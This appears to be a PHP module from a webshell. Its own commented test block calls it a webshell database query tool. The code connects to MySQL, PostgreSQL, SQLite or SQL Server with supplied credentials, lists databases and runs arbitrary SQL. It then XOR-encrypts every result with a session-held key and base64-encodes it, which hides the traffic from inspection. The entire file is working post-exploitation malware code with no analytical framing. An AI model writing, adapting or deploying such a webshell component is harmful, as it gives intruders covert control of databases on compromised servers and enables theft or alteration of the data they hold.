session_start();

/**
 * 列出数据库
 * @param string $driver 数据库驱动
 * @param string $host 主机地址
 * @param string $port 端口
 * @param string $user 用户名
 * @param string $pass 密码
 * @param string $encoding 编码
 * @return string 加密后的结果
 */
function listDatabases($driver, $host, $port, $user, $pass, $encoding)
{
    try {
        $dsn = buildDSN($driver, $host, $port, '', $encoding);
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        
        $databases = [];
        
        switch (strtolower($driver)) {
            case 'mysql':
                $stmt = $pdo->query("SHOW DATABASES");
                $databases = $stmt->fetchAll(PDO::FETCH_COLUMN);
                break;
            case 'pgsql':
                $stmt = $pdo->query("SELECT datname FROM pg_database WHERE datistemplate = false");
                $databases = $stmt->fetchAll(PDO::FETCH_COLUMN);
                break;
            case 'sqlsrv':
                $stmt = $pdo->query("SELECT name FROM sys.databases");
                $databases = $stmt->fetchAll(PDO::FETCH_COLUMN);
                break;
            default:
                $databases = ['不支持此驱动的数据库列表功能'];
        }
        
        $result = [
            'status' => 'success',
            'driver' => $driver,
            'host' => $host,
            'databases' => $databases,
            'count' => count($databases),
            'timestamp' => date('Y-m-d H:i:s'),
        ];
        echo encrypt(json_encode($result, JSON_UNESCAPED_UNICODE));
        return ;
        
    } catch (Exception $e) {
        $error = [
            'status' => 'error',
            'message' => $e->getMessage(),
            'timestamp' => date('Y-m-d H:i:s'),
        ];
        echo encrypt(json_encode($error, JSON_UNESCAPED_UNICODE));
        return ;
    }
}

/**
 * 主要数据库操作函数
 * @param string $driver 数据库驱动
 * @param string $host 主机地址
 * @param string $port 端口
 * @param string $user 用户名
 * @param string $pass 密码
 * @param string $database 数据库名
 * @param string $sql SQL语句
 * @param array $option PDO选项
 * @param string $encoding 编码
 * @return string 加密后的结果
 */
function main($driver, $host, $port, $user, $pass, $database, $sql, $option, $encoding)
{
    try {
        // 构建DSN
        $dsn = buildDSN($driver, $host, $port, $database, $encoding);
        
        // 默认选项
        $opts = [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_TIMEOUT => 10
        ];
        
        if (is_array($option)) {
            $opts = array_merge($opts, $option);
        }
        
        // 连接数据库
        $pdo = new PDO($dsn, $user, $pass, $opts);
        
        // 执行SQL
        $stmt = $pdo->prepare($sql);
        $stmt->execute();
        
        // 处理结果
        $sqlType = strtoupper(trim(explode(' ', $sql)[0]));
        $result = [];
        
        if (in_array($sqlType, ['SELECT', 'SHOW', 'DESCRIBE', 'EXPLAIN'])) {
            $result['data'] = $stmt->fetchAll();
            $result['rows'] = count($result['data']);
        } else {
            $result['affected'] = $stmt->rowCount();
            if ($sqlType === 'INSERT') {
                $result['insert_id'] = $pdo->lastInsertId();
            }
        }
        
        $output = [
            'status' => 'success',
            'database' => $database,
            'sql' => $sql,
            'timestamp' => date('Y-m-d H:i:s'),
            'result' => $result
        ];
        echo encrypt(json_encode($output, JSON_UNESCAPED_UNICODE));
        return ;
        
    } catch (Exception $e) {
        $error = [
            'status' => 'error',
            'message' => $e->getMessage(),
            'database' => $database,
            'timestamp' => date('Y-m-d H:i:s'),
        ];
        echo encrypt(json_encode($error, JSON_UNESCAPED_UNICODE));
        return ;
    }
}


/**
 * 构建DSN连接字符串
 */
function buildDSN($driver, $host, $port, $database, $encoding)
{
    switch (strtolower($driver)) {
        case 'mysql':
            $dsn = "mysql:host={$host};port={$port}";
            if ($database) $dsn .= ";dbname={$database}";
            if ($encoding) $dsn .= ";charset={$encoding}";
            break;
        case 'pgsql':
            $dsn = "pgsql:host={$host};port={$port}";
            if ($database) $dsn .= ";dbname={$database}";
            break;
        case 'sqlite':
            $dsn = "sqlite:{$database}";
            break;
        case 'sqlsrv':
            $dsn = "sqlsrv:Server={$host},{$port}";
            if ($database) $dsn .= ";Database={$database}";
            break;
        default:
            throw new Exception("不支持的数据库驱动: {$driver}");
    }
    return $dsn;
}

function encrypt($data)
{
    $key = $_SESSION['k'];
    for($i = 0; $i < strlen($data); $i++) {
        $data[$i] = $data[$i] ^ $key[($i + 5) & 15]; 
    }
    return base64_encode($data);
}

// // 简单测试输出
// echo "=== Webshell数据库查询工具 ===\n";
// echo "时间: " . date('Y-m-d H:i:s') . "\n";
// echo "用户: Rain1er\n\n";

// // 测试1：列出数据库
// echo "1. 列出MySQL数据库:\n";
// echo listDatabases('mysql', 'localhost', '3306', 'root', '', 'utf8mb4') . "\n\n";

// // 测试2：执行查询
// echo "2. 执行SELECT查询:\n";
// echo main('mysql', 'localhost', '3306', 'root', '', 'sys', 'SELECT version()', [], 'utf8mb4') . "\n\n";

// // 测试3：查看表
// echo "3. 查看数据库表:\n";
// echo main('mysql', 'localhost', '3306', 'root', '', 'sys', 'SHOW TABLES', [], 'utf8mb4') . "\n\n";

// echo "=== 工具说明 ===\n";
// echo "main(driver, host, port, user, pass, database, sql, option, encoding)\n";
// echo "listDatabases(driver, host, port, user, pass, encoding)\n";
// echo "所有结果均已加密输出\n";